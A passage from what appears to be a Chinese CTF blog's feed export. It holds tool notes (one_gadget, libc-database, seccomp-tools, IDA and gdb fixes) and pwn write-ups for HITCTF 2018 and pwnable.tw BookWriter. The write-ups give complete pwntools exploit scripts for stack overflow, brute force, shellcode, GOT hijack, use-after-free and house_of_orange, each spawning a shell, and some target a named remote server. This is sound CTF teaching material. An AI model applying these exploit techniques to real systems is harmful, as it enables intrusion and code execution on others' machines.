p4nda')add('step4\n',0,0x50,'hack by p4nda')delete_user('step4')delete_user('step4')#gdb.attach(p,'b *0x400a0f')add('step4\n',0,0x50,p64(libc.symbols['__malloc_hook']+0x10+0x08*6))add('step4\n',0,0x50,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')delete_user('padding')add('step4\n',0,0x50,p64(0)*3+p64(stack_addr-stack_offset-0x8))add('step4\n',0,0x40,p64(0x0000000000401053)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))#add('step3\n',18,0x60,'a'*0x40)p.interactive()'''============================================================0x000000000040104c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040104e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401050 : pop r14 ; pop r15 ; ret0x0000000000401052 : pop r15 ; ret0x000000000040104b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040104f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400870 : pop rbp ; ret0x0000000000401053 : pop rdi ; ret0x0000000000401051 : pop rsi ; pop r15 ; ret0x000000000040104d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400709 : ret0x0000000000400782 : ret 0x20180x0000000000400abd : ret 0x8b48''' 题目]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[问题解决及工具使用]]></title>
    <url>%2F2018%2F03%2F03%2Fquestion%2F</url>
    <content type="text"><![CDATA[记录一些工具的使用方法和遇到的问题解决途径 工具使用one_gadgetgithub : https://github.com/david942j/one_gadget 所谓 one_gadget 就是一个实现了直接执行system(‘/bin/sh’)的程序跳板。 常见的，可以使用one_gadget覆盖劫持got表、返回地址、hook（__malloc_hook、__free_hook）等等操作，也就是当可以劫持控制流后覆盖的捷径 安装方法安装one_gadget需要ruby环境，因为是由ruby写成的。 以ubuntu为例，首先安装ruby 1sudo apt-get install ruby 还需要安装ruby的包管理器 1sudo apt-get install gem 依赖安装好了以后就可以安装one_gadget了 1$ gem install one_gadget 使用方法一般针对libc使用，直接one_gadget libc.so就可以了 输出结果： 12345678910111213141516└─[$] &lt;&gt; one_gadget libc64.so 0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 当泄露了libc基地址以后再用libc base+offset就可以使用了，但需要注意one_gadget的输出是有一定限制的，如[$rax = NULL]，需要逐个尝试。 libc databasegithub: https://github.com/niklasb/libc-database 有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。 安装方法先下载libc database 1git clone https://github.com/niklasb/libc-database 利用get来下载流行的libc库 12cd libc-database./get 程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下 使用方法使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260 puts 0xf7xxxf30，输入最后三位即可 12$ ./find printf 260 puts f30archive-glibc (id libc6_2.19-10ubuntu2_i386) seccomp-toolsgithub： https://github.com/david942j/seccomp-tools 主要是针对linux seccomp沙箱规则的读取 安装方法1gem install seccomp-tools 如果遇到报错，可参考下面问题解决… 使用方法主要就用dump了… 1seccomp-tools dump ./xxxx 比如查看检查到的某通防机制 问题解决ida “sp-analysis failed” 错误问题描述具体情况是在分析QWB CTF 2018 比赛中raisepig一题中，发现某些函数在按F5进行反编译时，出现这个问题，导致无法查看反编译代码。 参考了本队大佬的博客以后，解决了问题。 解决方法问题原因貌似是在代码执行中的pop、push操作不匹配，导致ida解析的时候对esp的值产生错误造成的。这种不匹配可能对程序执行并无影响。 一种可能的解决办法是： 首先，在ida中打开栈指针的显示：options-general-stack pointer (勾选) 结果会在原来的地址偏移的旁边，显示函数栈内ESP寄存器的偏移： 可以看到在出现问题的函数中，retn前的偏移是一个非0值，这回导致ida识别函数出错，修改的目的就是使这个值为0，修改办法是使用“ALT + K”快捷键，强行使esp保持平衡，具体操作是： 在leave这一行（这很重要）按快捷键“ALT+K”，修改其值为leave前方标志的其ESP偏移值： 当发现，retn前标志的ESP偏移是00时，按F5应该就可以反编译了（不要care红色的报错，果断的按F5！） gem “ERROR: Failed to build gem native extension.”问题问题描述在安装seccomp-tools时，使用 1gem install seccomp-tools 命令时，出现报错 1234567 ERROR: Error installing seccomp-tools: ERROR: Failed to build gem native extension. /System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/bin/ruby extconf.rb mkmf.rb can&apos;t find header files for ruby at /System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/lib/ruby/ruby.h 解决方法缺少ruby-dev，执行 1sudo apt-get install ruby-dev 不蒜子统计数目消失，只留下竖线问题描述10月9日，查看blog时，突然发现最下方统计数目消失，只剩下原本中间的细线了，最初以为是网络的问题，后来发下其他设备访问也同样是这样，访问一些相同主题的blog发现都消失。顺手将这个问题反馈到主题的issue，但是并没有解决。 解决方法是在忍不了了，查看了一下文档，发现使用的默认统计插件是不蒜子 ，进入官网后突然发现公告： 1234567！！！！2018年9月 - 重要提示 ！！！！大家好，因七牛强制过期原有的『dn-lbstatics.qbox.me』域名（预计2018年10月初），与客服沟通数次无果，即使我提出为此付费也不行，只能更换域名到『busuanzi.ibruce.info』！因我是最早的一批七牛用户，为七牛至少带来了数百个邀请用户，很痛心，很无奈！各位继续使用不蒜子提供的服务，只需把原有的：&lt;script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt;域名改一下即可：&lt;script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt;只需要修改该js域名，其他均未改变。若有疑问，可以加入不蒜子交流QQ群：`419260983`，对您带来的不便，非常抱歉！！！还是那句话，不蒜子不会中断服务！！！！ 也就是说问题原因是不蒜子的域名过期了。 这个问题就很好解决了，首先使用sublime等软件把主题的文件夹打开，全局搜素“dn-lbstatics.qbox.me”，把这个字符串换成“busuanzi.ibruce.info”，重新生成一下就可以了。 本blog使用的yelee主题默认字符串在文件。123456## gdb调试内核时，报`Remote &apos;g&apos; packet reply is too long`错误### 问题描述在remote模式调试x86-64的linux内核时，在每执行一步指令后都报错如下，尤其是在ni这样的指令都会中断 vmlinux: No such file or directory.The target architecture is assumed to be i386:x86-64:intelRemote debugging using localhost:48690xffffffff811dea46 in ?? ()Continuing.^CRemote ‘g’ packet reply is too long: 000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000703e8081ffffffff703e8081ffffffff0400000000000000c09b8581ffffffff60be030000c9ffff48b302008088ffff000000000000000000a98c81ffffffffa0108d81ffffffff000000000000000046ea1d81ffffffff4602000010000000180000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007f030000000000000000000000000000000000000000000000000000000000000004000000000000f0e4e00100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ff00ffff72000810182028303840094800000000ffffffffffffffffffffffffffffffff04000000040000000400000004000000e0738d0000000000e0738d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000801f0000 12345678910111213141516### 问题解决问题原因是gdb在处理数据时，接受数据超长就会以error结束。可以通过patch gdb源码解决。首先下载一个新的gdb，下载地址`ftp://ftp.gnu.org/gnu/gdb`然后解压编译：```bashtar xf gdb-8.2.tar.xzcd gdb-8.2mkdir ~/gdb-8.2 # 安装目录./configure --prefix=&lt;你的install绝对路径&gt; 修改源码/gdb/remote.c中的第8035行至8039行，将 1234/* Further sanity checks, with knowledge of the architecture. */if (buf_len &gt; 2 * rsa-&gt;sizeof_g_packet) error (_("Remote 'g' packet reply is too long (expected %ld bytes, got %d " "bytes): %s"), rsa-&gt;sizeof_g_packet, buf_len / 2, rs-&gt;buf); 注释掉，更改为 1234567891011if (buf_len &gt; 2 * rsa-&gt;sizeof_g_packet) &#123; rsa-&gt;sizeof_g_packet = buf_len ; for (i = 0; i &lt; gdbarch_num_regs (gdbarch); i++) &#123; if (rsa-&gt;regs[i].pnum == -1) continue; if (rsa-&gt;regs[i].offset &gt;= rsa-&gt;sizeof_g_packet) rsa-&gt;regs[i].in_g_packet = 0; else rsa-&gt;regs[i].in_g_packet = 1; &#125;&#125; 注意，此处和网上其他修改有区别，其他版本修改的代码为 1234567891011if (buf_len &gt; 2 * rsa-&gt;sizeof_g_packet) &#123; rsa-&gt;sizeof_g_packet = buf_len ; for (i = 0; i &lt; gdbarch_num_regs (gdbarch); i++) &#123; if (rsa-&gt;regs-&gt;pnum == -1) continue; if (rsa-&gt;regs-&gt;offset &gt;= rsa-&gt;sizeof_g_packet) rsa-&gt;regs-&gt;in_g_packet = 0; else rsa-&gt;regs-&gt;in_g_packet = 1; &#125; &#125; 但在8.2版本中regs这个成员定义有变化，参照后续的代码，可以修改正确。 之后执行 12make make install 在运行~/gdb-8.2/bin/gdb时，加载pwndbg出错，提升 1python ImportError: No module named builtins 解决方法是sudo pip install future 在更新pip以后，报错 1Traceback (most recent call last): File &quot;/usr/bin/pip&quot;, line 9, 解决方案是修改/usr/bin/pip文件为： 1234567891011#!/usr/bin/python# GENERATED BY DEBIANimport sys# Run the main entry point, similarly to how setuptools does it, but because# we didn't install the actual entry point from setup.py, don't use the# pkg_resources API.from pip import __main__if __name__ == '__main__': sys.exit(__main__._main()) 解决了这一堆问题，这样就可以正常调试内核了。]]></content>
      <tags>
        <tag>Questions</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCTF 2018 PWN 题记录]]></title>
    <url>%2F2018%2F02%2F05%2Fhitctf%2F</url>
    <content type="text"><![CDATA[HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。 本次比赛共有五道PWN题： stackoverflow （栈溢出） login（爆破） DragonBall（整数溢出） nodes（溢出BSS段，影响程序逻辑） babynote（UAF） stackoverflow此题目是PWN题的签到题，函数逻辑简单，在主函数调用的vuln函数中存在明显的栈溢出漏洞 可以溢出覆盖0x18个字节，并且没有开启canary保护， 可以利用ROP技术控制执行流 如程序中存在一个flag函数，可以直接获取flag exp.py脚本如下 123456789101112131415from pwn import *debug =0elf = ELF('./stackoverflow')if debug: p = process('./stackoverflow') context.log_level = 'debug'else: p = remote('111.230.132.82',40000) context.log_level = 'debug'p.recvuntil('Welcome to pwn world!\nLeave your name:')p.send('a'*0x28+p32(0xdeadbeef)+p32(0x80485df)+p32(0xdeadbeef)+p32(0xdeadbeef)+p32(0xc0ffee))p.interactive() login此题的整体代码逻辑很清晰，首先登录一次，然后再过一次check，就可以直接得到flag 对比两个用户名密码的check函数可以发现其中的不同： 很明显发现其不同点在于strncmp的参数上，第一个函数参数长度是用户输入的长度，第二次是固定的长度。此时可以发现两个hint。 password的长度是0x20（抖机灵） 由于password是固定的，因此可以通过爆破的方法来验证，每次爆破一位不断叠加，即可得到其真实密码。 爆破的脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *'''10_adhUNwj_qidACn_qdXon912_uhdq6'''debug = 0if debug: p = process('./login') #libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p)else: p = remote('111.230.132.82', 40001) #context.log_level = 'debug' #libc = ELF('./libc_32.so.6')password = ''dic = range(33,127)def login(j): global password print 'password' + chr(j) if debug: p = process('./login') context.log_level = 'debug' else: p = remote('111.230.132.82', 40001) #context.log_level = 'debug' p.recvuntil('Username:') p.sendline('root') p.recvuntil('Password: ') p.sendline(password+chr(j)) a = p.recvline() print a if 'successful' in a: p.close() return chr(j) else: p.close() return '00'def boom(): global password for i in range(0,0x20): pro = log.progress('go') for j in dic: pro.status('boom for '+chr(j)) #tmp = '' tmp = login(j) #print tmp if tmp!='00': password = password + tmp pro.success(': is '+password) print 'password is ',password breakpassword = ''boom()p.interactive() DragonBall程序大意是 手中共有15个金币， 购买一个龙珠需要5金币，出售一个龙珠3金币，当集齐7颗龙珠以后就能实现愿望了（wish()）。 漏洞利用wish()函数中有明显的溢出漏洞，但是很不充分，溢出仅能覆盖返回地址和EBP，如果单纯写rop很难，除非有很好的跳板，但是并没有发现jmp xxx的跳板，一度陷入僵局… 突然想起查了一下保护开启情况，发现没有开NX保护，也就是说可以执行shellcode… 就是说可以在第一块内写入execve(‘/bin/sh’)的shellcode，然后覆盖返回地址去执行，仅需知道该处的地址即可，需要泄露栈地址，此处可以从第一处写入部分去泄露，泄露wish()的ebp地址，即可得到shellcode起始位置的地址了。 整数溢出漏洞在于buy()中，仅检测是否money!=0的情况，也就是说构造一个money不为5的倍数即可无限制购买，很显然可以先买一个再卖出，就剩余13个金币，无论如何都不可能为0，因此可以无限制购买龙珠，最后达成愿望。 最终，利用脚本如下： 1234567891011121314151617181920212223242526272829303132333435from pwn import *debug = 0elf = ELF('./DragonBall')if debug: p = process('./DragonBall') context.log_level = 'debug'else: p = remote('111.230.132.82', 40002) context.log_level = 'debug'p.recvuntil('You choice: ')p.sendline('1')p.recvuntil('You choice: ')p.sendline('2')for i in range(7): p.recvuntil('You choice: ') p.sendline('1')p.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')payload = asm(shellcraft.sh())payload = payload.ljust(0x66,'a')p.sendline(payload+'b')p.recvuntil('ab')stack_leak = u32(p.recv(5)[1:])print 'stack_leak : ',hex(stack_leak)offset = 0xffa7cc48-0xffa7cbc0payload_addr = stack_leak - offsetprint 'shellcode : ',hex(payload_addr)p.recvuntil('is it right?\n(Y/N) ')p.sendline('a'*0x38+p32(stack_leak)+p32(payload_addr))p.interactive() notes程序的大概内容是程序维护这一个链表，链表各块使用malloc分配，大小为0x38（56）个字节，最开始四字节是一个unsigned int，命名为value，相当于一个索引，之后的48个字节为data，最后四字节为下一个块的地址。 程序利用value值遍历这个链表，找到这个链表的第一个value相同的项进行修改。 在这期间没有任何溢出问题。 漏洞位置漏洞出现的原因有2点 程序利用bss段上的某一个值对data长度进行限定,初始值为48 程序输出是先用sprintf函数拷贝到bss段上某一个位置，在用puts进行打印，而由于该缓存字符串的长度限定有问题，在建立了100个字节以上的节点时，会出现溢出现象，而溢出的点恰好为1中提到的data长度，将其覆盖成为字符’s’，也就是115，进一步造成了堆溢出。 漏洞利用漏洞利用思路是首先构造100个节点，造成堆溢出，此时可以的输入可以覆盖到下一块的地址部分，也就是说可以劫持链表，利用程序功能造成内存任意读写。 首先将某数据库的下一块地址覆盖为puts@got地址，这样利用打印功能可以泄露libc的puts函数地址。 再对该块进行写操作，利用的索引即是泄露的puts地址，因为该块已经在链表中了，将该块地址覆写为一个one_gadget地址，最终利用puts函数的调用触发，即劫持got表。 利用脚本如下：（io貌似还有点问题没有解决） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *import timedebug = 0elf = ELF('./nodes')if debug: p = process('./nodes') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('111.230.132.82', 40003) context.log_level = 'debug' libc = ELF('./libc.so.6')def add(value,data): p.recvuntil('please input your choice:') p.sendline('1') p.recvuntil('Value:') p.send(str(value)+'\0') p.recvuntil('Data:') p.sendline('') #time.sleep() p.recvuntil('nodes\n')#def changefor i in range(1,103): add(i,'a')p.recvuntil('please input your choice:')p.sendline('3')p.recvuntil('please input your choice:')p.sendline('2\0')p.recvuntil('Node\'s value:')p.sendline('101')p.recvuntil('New value:')p.sendline('101')p.recvuntil('New data:')p.sendline('a'*48+p32(elf.got['puts']))p.recvuntil('please input your choice:')p.sendline('3')p.recvuntil('Value:101\n')p.recvline()p.recvline()a = p.recvline()puts_addr = int(a[6:-1],10)libc.address = puts_addr - libc.symbols['puts'] print '[+]puts addr:',hex(puts_addr)p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil('Node\'s value:')p.sendline(a[6:-1])p.recvuntil('New value:')p.sendline(str(libc.address+0x3ac5c))p.recvuntil('New data:')p.sendline('')p.recvuntil('choice:')p.sendline('4')p.interactive()'''0x3ac5c execve("/bin/sh", esp+0x28, environ)constraints: esi is the GOT address of libc [esp+0x28] == NULL0x3ac5e execve("/bin/sh", esp+0x2c, environ)constraints: esi is the GOT address of libc [esp+0x2c] == NULL0x3ac62 execve("/bin/sh", esp+0x30, environ)constraints: esi is the GOT address of libc [esp+0x30] == NULL0x3ac69 execve("/bin/sh", esp+0x34, environ)constraints: esi is the GOT address of libc [esp+0x34] == NULL0x5fbc5 execl("/bin/sh", eax)constraints: esi is the GOT address of libc eax == NULL0x5fbc6 execl("/bin/sh", [esp])constraints: esi is the GOT address of libc [esp] == NULL''' babynote一道比较典型的UAF漏洞。 逻辑分析程序逻辑是一个可以任意输入的note，每一个note分为了两部分：block和content block的结构为： 123+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| size（int） | content address | function ptr | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ content的大小为size值 add函数中详细的为每一个变量赋值，尤其是function ptr，初始值为某自实现的puts函数 print函数中显示了调用function ptr函数的参数和方法，可以想到如果可以劫持function ptr就可以执行任意命令 在程序中要求最多可以生成3个note，分别存储在bss段上的一个数组内 利用思路显然，由于在edit的时候并没有检查堆块是否已经被释放，因此，存在明显的UAF(Use After Free)漏洞。 而且删除堆块时程序的释放顺序是先释放content，再释放block，由于fastbin的LIFO性质，可以明显知道 123add（0xc，&apos;p4nda&apos;）delete(0)add(0xc,&apos;p4nda&apos;) 使用的堆块是不变的，因此想要用分配得到的content控制一个note的block，进而控制function ptr的方法必须让堆块分配不平衡。 比如 12345add(0x100,&apos;p4nda&apos;)add(0xc,&apos;p4nda&apos;)delete(1)delete(0)add(0xc,payload) 这样分配，可以导致第0个note的block分配给第2个note的block，而第1个note的block会分配给第二个note作为content，是可以编辑的，进一步可以劫持控制流。 地址泄露此题开启了PIE保护，不可以使用题目文件中的固定地址了。同时需要利用获取system地址，来得到shell，因此泄露一个libc地址是很必要的。 这时存在一个堆块分配与释放的机制问题，堆块在libc的内存管理中主要分fastbin、unsorted bin、 small bin、large bin、top、mmap来管理，其中fastbin管理的是较小堆块，当内存小于global_max_fast值时，在内存释放时会挂载到fastbin中，而稍大一些的small bin、large bin在释放时，当不与top头相邻，会先挂载到unsorted bin中去。 而如何寻找到各个bin的地址？libc在bss段上设置了一个结构体变量叫 main_arena，变量的各个成员就是每个bin的开头，如图 在libc符号表中，没有mainarena的符号，但该地址与\_mallochook很近，通常利用 \_mall_hook来定位main_arena 在各个bin链表中，不同的链表有不同的组织方式，如fastbin是单链表，unsorted bin、small bin是双链表，largebin更为复杂。因此，常用的地址泄露的方式是从unsorted bin泄露，当可以任意读取unsorted bin数据时，堆块的fd位置即为main_arena中unsorted bin地址。 如在此题中就可以用这种方式泄露 劫持控制流12345add(0x100,&apos;p4nda&apos;)add(0xc,&apos;p4nda&apos;)delete(1)delete(0)add(0xc,payload) 当按上述方法控制了第1块的block时，修改payload即可完成对控制流的劫持，如利用泄露的libc地址获取system()地址，将其覆盖到function ptr时，在将size覆盖成 sh\x00\x00，利用print(1)进行触发即可获得一个shell +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | &apos;sh\0\0&apos; | anything | system address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 利用脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *debug = 0elf = ELF('./babynote')if debug: p = process('./babynote') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('111.230.132.82', 40004) context.log_level = 'debug' libc = ELF('./libc.so.6')def add(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def edit(index,content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('index:') p.sendline(str(index)) p.recvuntil('content') p.send(content)def print_note(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('index:') p.sendline(str(index))def delete(index): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('index:') p.sendline(str(index))add(0x100,'p4nda')add(0xc,'p4nda')delete(1)delete(0)print_note(0)libc_leak_addr = u32(p.recv(4))libc.address = libc_leak_addr - libc.symbols['__malloc_hook']-48-0x18print '[+] system :',hex(libc.symbols['system'])add(0xc,'sh\0\0'+p32(next(libc.search('/bin/sh')))+p32(libc.symbols['system']))print_note(1)p.interactive() 题目]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 BookWriter 解题思路]]></title>
    <url>%2F2017%2F12%2F15%2Fpwnable-tw-bookwriter%2F</url>
    <content type="text"><![CDATA[背景最开始是发到了看雪论坛上的 最近在学习house_of_orange技术，house_of_orange技术已经和house_of_lore、house_of_Spirit一样，成为一种堆溢出利用技巧，思路来自ctf-HITCON-2016的同名题目。最近学习到这里，看了github上shellphish/how2heap中的讲解和多篇题解对漏洞触发条件依然不太理解，恰巧做到了pwnable.tw上的BookWriter题目，真正实践了一次。 题目分析首先这是一道逻辑清晰的题目，主要有添加书页、浏览书页、编辑书页和查看信息功能。 其中定义了两个int[8]数组在BSS段，分别存储书页的地址和书页内容大小信息，两数组在BSS段上位置相邻。 添加操作使用从0~8顺序查找的方式，进行堆块申请，堆块大小由用户输入，并且用户此时可获得一次输入堆块内容的机会。 查看书页内容操作，用户可输入0~7的数字查询书页内容。 编辑操作，用户同样可输入0~7数字，根据存储在size数组的大小进行写入，并利用strlen函数，重新更新书页的size值。 查看信息。打印一系列信息。 题目中给出的libc.so版本是 2.23 #漏洞分析 堆地址泄露可以主要到bss段上的排列顺序是char author_name[0x40]、int page[8]、int page_size[8]。在输入author_name时，输入长度是0x40，打印时使用%s，造成泄露page中存储的堆地址。 堆溢出堆溢出漏洞有两处，第一处在edit函数中，用户输入完数据后，程序使用strlen函数重置page_size的值，当用户输入与下一堆块中的size相连时，strlen会返回用户输入长度+下一堆块size，再次编辑造成了下一堆块的size被篡改。第二处在于add函数中对允许写入的判断是i&lt;=8,page[i]==NULL。可以发现&amp;page[8] = &amp;page[0]的地址，当page[0]被覆盖为一个堆块地址时，造成了对page[0]超长写入，可以覆盖到很远的地址,可以说是一个等号引发的血案了。 漏洞利用整个程序中没有出现free函数，常规的UAF、Double free都不存在。看了很多的house_of_orange资料，恰好想到使用这种方法，这种攻击成功需要如下条件（shellphish上提供的方法）： heap地址 2. 堆溢出 3. libc地址 4. libc 2.23及以下版本（2.24版本开始对vtable有check，不过也可以绕过） house_of_orange思路简介： 首先修改top块的size，然后申请一个较大的块（不大于mmap申请的阈值，大于top块当前大小），当修改的size满足一定条件时，原来的top会被释放到unsorted bin。 通过堆溢出覆写原top内容，主要是构造IO_file_plus指针中的函数虚表，并伪造bk指针为unsorted bin攻击做铺垫。 当再次申请内存时，造成unsorted bin attack，将\__IO_list_all覆写为原top头地址，由于unsorted bin结构的破坏，程序异常，会在malloc中调用malloc_printerr函数进行错误打印，在malloc_printerr中调用__libc_message，进一步调用abort()，再调用 _IO_flush_all_lockp()，在其中调用了_IO_OVERFLOW(fp,EOF)，这个函数是使用虚表调用，如果可以覆盖调用的虚表，就可以达到执行system(‘/bin/sh’)。 针对上述步骤可以在这道题中一一对照实现。 首先是修改top块的size，可以通过add一个块，edit两次进行对top头size的覆写，经过修改，top的地址与大小如图所示： 这个size块覆写必须满足两点要求，top块才可被释放到unsorted bin 1.size&gt;=MINSIZE 2. pre_inuse 2. top地址+size-1 是页对齐的（以000结尾，比如此题中0x187a020+0xfe1-1 = 0x187b000） 当满足这一点时，再次申请一个较大堆块时就会把这个top块释放到unsorted bin中，值得注意的是，此题有一个在info函数中调用了scanf函数，scanf内部会申请一个0x1000大小的块，且不释放，就可以达到将原top头释放到unsorted bin的目的，并且可以此函数可以泄露堆地址。 由于申请小堆块是从unsorted bin直接切割，可以通过分配得到的堆块泄露libc地址（main_arena+88）。 接下来就可以堆溢出构造unsorted bin攻击了。 首先看漏洞的触发，在genops.c的_IO_flush_all_lockp (int do_lock)函数中，fp会从_IO_list_all开始，当不满足某条件时，循环修改fp = fp-&gt;chain，执行 _IO_OVERFLOW，_IO_list_all是一个_IO_FILE_plus类型的指针，在ibc中。 查看_IO_list_all内容，_IO_list_all是一个_IO_FILE_plus指针，指向_IO_2_2_stdout， 其中包含一个虚表vtable，用于函数调用，包括许多函数 因此，思路可以是通过unsorted bin，将_IO_list_all指针内容修改，可以改到main_arena+88也就是unsorted bin头的地址，当改成这个地址时，其内容时不满足执行_IO_OVERFLOW，转而去寻找位于chain这个位置的地址，继续执行。为了继续构造，可以去把这个地方的地址写成我们能控制内存的地址，这个位置是main_arena+216，是在fastbin链中，堆块大小为0x60的fastbin的地址，可以通过把unsorted bin中的原top挂到fastbin的方法来进一步利用，可把原top头的地址修改成0x61，并且修改bk指针为&amp;_IO_list_all-0x10。这样通过malloc新建堆块时，由于unsorted bin中的堆块不唯一，就会把unsorted bin中堆块释放到bin中去，释放原top头时，会把该块挂载到fastbin[4]，也就是我们期待的位置去，然后再处理bk指针，也就是_IO_list_all，会触发堆块大小为0的错误，进一步触发malloc_printerr 等一系列函数… 下一步就是在原top内伪造_IO_file_plus结构体，满足 1.fp-&gt;mode&gt;0 2._IO_vtable_offset (fp) ==0 3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 即可，构造的结构体如下：（不小心按错退出了，与原先的top地址有变化） 最终malloc一个堆块即可触发漏洞，获得shell EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *debug = 1elf = ELF('./bookwriter')if debug: p = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' else: pass def add(num,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of page :') p.sendline(str(num)) p.recvuntil('Content :') p.send(content)def view(num): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index of page :') p.sendline(str(num))def edit(num,content): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index of page :') p.sendline(str(num)) p.recvuntil('Content:') p.send(content)def info(num,content): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('(yes:1 / no:0) ') p.sendline(str(num)) if(num): p.recvuntil('Author :') p.sendline(content) else: passdef leak_heap(): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('a'*0x40) result = u64(p.recvline()[0:-1].ljust(8,'\0')) p.recvuntil('(yes:1 / no:0) ') p.sendline('0') return result #int(resultq[0:-1],10)#gdb.attach(p,'b *0x400bdd')p.recvuntil('Author :')p.sendline('a'*0x40)add(0x18,'a'*0x18) #0edit(0,'a'*0x18)edit(0,'\0'*0x18+'\xe1'+'\x0f'+'\0')heap_addr = leak_heap()for i in range(8): add(0x40,'p4nda123')#2view(2)p.recvuntil('p4nda123')libc_addr = u64(p.recvline()[0:-1].ljust(8,'\0')) libc.address = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']print 'libc_addr:',hex(libc_addr)print 'system: ',hex(libc.symbols['system'])print 'heap: ',hex(heap_addr)edit(0,'\0'*0x290+'/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)+p64(0)*9+p64(libc.symbols['system']) + p64(0)*11 + p64(heap_addr+0x120+0x60+0x170) ) p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Size of page :')p.sendline(str(0x10))p.interactive() referencehttps://www.anquanke.com/post/id/84987 https://zhuanlan.zhihu.com/p/31079264?utm_medium=social&amp;utm_source=qq http://www.cnblogs.com/shangye/p/6268981.html https://github.com/shellphish/how2heap/blob/master/house_of_orange.c https://www.sourceware.org/ml/libc-alpha/2016-02/msg00502.html]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 alive_note 解题思路]]></title>
    <url>%2F2017%2F12%2F06%2Fpwnable-tw-alivenote%2F</url>
